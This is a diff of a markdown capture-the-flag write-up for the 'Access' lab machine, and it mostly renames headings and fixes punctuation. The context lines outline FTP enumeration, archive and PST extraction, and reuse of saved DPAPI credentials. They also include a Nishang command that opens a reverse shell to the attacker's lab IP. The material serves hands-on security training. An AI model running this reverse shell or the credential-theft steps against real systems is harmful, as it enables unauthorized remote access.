@@ -2,8 +2,8 @@
 `Level: Easy`
 ### Index
 1. [Box Info](#Box%20Info)
-2. [Initial Enumeration](#Initial%20Enumeration)
-	1. [`Initial Enumeration Observations`](#`Initial%20Enumeration%20Observations`)
+2. [Initial_Nmap](#Initial_Nmap)
+	1. [Initial Enumeration Observations](#Initial%20Enumeration%20Observations)
 	2. [`FTP Binary Mode to download the file using FTP. Make Sure to use SUDO you dumber`](#`FTP%20Binary%20Mode%20to%20download%20the%20file%20using%20FTP.%20Make%20Sure%20to%20use%20SUDO%20you%20dumber`)
 3. [Microsoft Access Database (MDB) Files](#Microsoft%20Access%20Database%20(MDB)%20Files)
 	1. [`Extracting Password Protected 7z ZIP file`](#`Extracting%20Password%20Protected%207z%20ZIP%20file`)
@@ -13,12 +13,12 @@
 	1. [`CTF Using DPAPI Creds`](#`CTF%20Using%20DPAPI%20Creds`)
 5. [`Dumb Mistakes`](#`Dumb%20Mistakes`)
 6. [`Privilege Escalation Using PowerShell`](#`Privilege%20Escalation%20Using%20PowerShell`)
-### Box Info
+### `Box-Info`
 ```
 Access is an &amp;quot;easy&amp;quot; difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.
 ```
 
-### Initial Enumeration
+### `Initial_Nmap`
 
 ```
 PORT   STATE SERVICE VERSION
@@ -277,7 +277,6 @@ $ ls
 'Access Control.pst'
 ```
 ###### `Personal Storage Table (PST) File`
-
 Okay now we have got the .pst file. Upon using the following command, we can extract the .mbox file.
 ```
 $ sudo readpst -w Access\ Control.pst 
@@ -381,7 +380,7 @@ Cool. Now I tune into **Writeup**. We have two options. Use **Runas** along with
 Get [Nishang](https://github.com/samratashok/nishang) - For xyz reason, This method was not working when I tried it out. But I saw couple of writeups even the official writeup has this method written in it.
 Change the following line or add the following line at the end of `Invoke-PowerShellTCP.ps1` file. 
 
-Check out why it was not working Under [Dumb Mistakes](#Dumb%20Mistakes) Section
+Check out why it was not working Under [Dumb Mistakes](#Dumb%20Mistakes) Section.
 
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4444
